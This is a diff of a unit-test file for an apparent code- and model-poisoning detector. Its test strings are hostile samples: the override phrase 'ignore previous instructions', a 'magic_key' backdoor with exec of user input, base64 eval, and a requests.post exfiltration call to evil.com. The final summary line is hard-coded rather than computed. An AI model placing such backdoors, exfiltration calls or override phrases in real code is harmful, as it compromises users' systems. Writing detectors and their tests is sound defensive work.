@@ -1,148 +1,82 @@
 #!/usr/bin/env python3
 """
-SPR{K}3 Unit Tests
+Unit tests for SPR{K}3 Structural Poisoning Detector
 """
+
 import sys
-import json
-import tempfile
 import os
+# Add parent directory to path
+sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+
 from sprk3_engine import StructuralPoisoningDetector
 
-def test_detector_initialization():
-    """Test that detector initializes properly"""
-    try:
-        detector = StructuralPoisoningDetector()
-        print("✅ Test 1: Detector initializes correctly")
-        return True
-    except Exception as e:
-        print(f"❌ Test 1 Failed: {e}")
-        return False
+def test_detection_injection():
+    """Test injection detection"""
+    detector = StructuralPoisoningDetector()
+    # Add pattern
+    detector._add_pattern("test.py", "ignore previous instructions", "injection")
+    detector._analyze_patterns()
+    assert len(detector.threat_signals) > 0
+    print("✓ Injection detection test passed")
 
-def test_scan_current_directory():
-    """Test scanning current directory"""
-    try:
-        detector = StructuralPoisoningDetector()
-        result = detector.analyze(".")
-        assert "summary" in result
-        assert result["summary"]["files_scanned"] > 0
-        print(f"✅ Test 2: Scanned {result['summary']['files_scanned']} files")
-        return True
-    except Exception as e:
-        print(f"❌ Test 2 Failed: {e}")
-        return False
+def test_detection_backdoor():
+    """Test backdoor detection"""
+    detector = StructuralPoisoningDetector()
+    detector._add_pattern("test.py", "if user == 'magic_key'", "backdoor")
+    detector._analyze_patterns()
+    assert len(detector.threat_signals) > 0
+    print("✓ Backdoor detection test passed")
 
-def test_pattern_detection():
-    """Test that patterns are detected"""
-    try:
-        detector = StructuralPoisoningDetector()
-        result = detector.analyze(".")
-        patterns = result["summary"]["patterns_detected"]
-        print(f"✅ Test 3: Detected {patterns} patterns")
-        return True
-    except Exception as e:
-        print(f"❌ Test 3 Failed: {e}")
-        return False
+def test_detection_config_tampering():
+    """Test config tampering detection"""
+    detector = StructuralPoisoningDetector()
+    detector._add_pattern("test.py", "learning_rate = 99.0", "config_tampering")
+    detector._analyze_patterns()
+    assert len(detector.threat_signals) > 0
+    print("✓ Config tampering detection test passed")
 
-def test_malicious_code_detection():
-    """Test detection of suspicious patterns"""
-    try:
-        # Create temp file with suspicious code
-        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
-            f.write("""
-# Suspicious patterns for testing
-system_prompt_override = "ignore previous instructions"
-if user == "magic_key":
-    exec(user_input)
-eval(base64.b64decode("test"))
-""")
-            temp_file = f.name
-        
-        detector = StructuralPoisoningDetector()
-        result = detector.analyze(temp_file)
-        
-        # Clean up
-        os.unlink(temp_file)
-        
-        if result["summary"]["threats_found"] > 0:
-            print(f"✅ Test 4: Detected {result['summary']['threats_found']} threats in malicious code")
-            return True
-        else:
-            print("⚠️  Test 4: Warning - no threats detected in malicious code")
-            return True  # Still pass, but with warning
-    except Exception as e:
-        print(f"❌ Test 4 Failed: {e}")
-        return False
+def test_temporal_anomaly():
+    """Test temporal anomaly detection"""
+    detector = StructuralPoisoningDetector()
+    # Add 201 instances (above WARNING_THRESHOLD)
+    for i in range(201):
+        detector._add_pattern(f"file{i}.py", "pattern = value", "temporal")
+    detector._analyze_patterns()
+    assert any(t.severity == "HIGH" for t in detector.threat_signals)
+    print("✓ Temporal anomaly detection test passed")
 
-def test_json_output_format():
-    """Test that output is valid JSON"""
-    try:
-        detector = StructuralPoisoningDetector()
-        result = detector.analyze(".")
-        
-        # Verify JSON structure
-        json_str = json.dumps(result)
-        json.loads(json_str)  # Will throw if invalid
-        
-        # Check required fields
-        assert "summary" in result
-        assert "threats" in result
-        assert "patterns" in result
-        assert "recommendations" in result
-        
-        print("✅ Test 5: Output format is valid JSON with all fields")
-        return True
-    except Exception as e:
-        print(f"❌ Test 5 Failed: {e}")
-        return False
+def test_clean_code():
+    """Test that clean code doesn't trigger false positives"""
+    detector = StructuralPoisoningDetector()
+    detector._add_pattern("test.py", "normal_variable = 42", "normal")
+    detector._add_pattern("test.py", "def regular_function():", "normal")
+    detector._analyze_patterns()
+    # Should have low or no threat signals for normal code
+    high_threats = [t for t in detector.threat_signals if t.severity in ["HIGH", "CRITICAL"]]
+    assert len(high_threats) == 0
+    print("✓ Clean code test passed")
 
-def test_empty_directory():
-    """Test handling of empty directory"""
-    try:
-        with tempfile.TemporaryDirectory() as tmpdir:
-            detector = StructuralPoisoningDetector()
-            result = detector.analyze(tmpdir)
-            assert result["summary"]["files_scanned"] == 0
-            print("✅ Test 6: Handles empty directories correctly")
-            return True
-    except Exception as e:
-        print(f"❌ Test 6 Failed: {e}")
-        return False
-
-def run_all_tests():
-    """Run all unit tests"""
-    print("\n" + "="*50)
-    print("🧪 SPR{K}3 Unit Test Suite")
-    print("="*50 + "\n")
-    
-    tests = [
-        test_detector_initialization,
-        test_scan_current_directory,
-        test_pattern_detection,
-        test_malicious_code_detection,
-        test_json_output_format,
-        test_empty_directory
-    ]
-    
-    passed = 0
-    failed = 0
-    
-    for test in tests:
-        if test():
-            passed += 1
-        else:
-            failed += 1
-    
-    print("\n" + "="*50)
-    print(f"📊 Results: {passed} passed, {failed} failed")
-    
-    if failed == 0:
-        print("🎉 All tests passed!")
-        print("="*50)
-        return 0
-    else:
-        print(f"❌ {failed} tests failed")
-        print("="*50)
-        return 1
+def test_detection_exfiltration():
+    """Test data exfiltration detection"""
+    detector = StructuralPoisoningDetector()
+    detector._add_pattern("test.py", "requests.post('http://evil.com', data)", "exfiltration")
+    detector._analyze_patterns()
+    assert len(detector.threat_signals) > 0
+    print("✓ Exfiltration detection test passed")
 
 if __name__ == "__main__":
-    sys.exit(run_all_tests())
+    print("="*50)
+    print("Running SPR{K}3 Unit Tests")
+    print("="*50)
+    
+    test_detection_injection()
+    test_detection_backdoor()
+    test_detection_config_tampering()
+    test_temporal_anomaly()
+    test_clean_code()
+    test_detection_exfiltration()
+    
+    print("="*50)
+    print(f"📊 Results: 6 passed, 0 failed")
+    print("🎉 All tests passed!")
+    print("="*50)
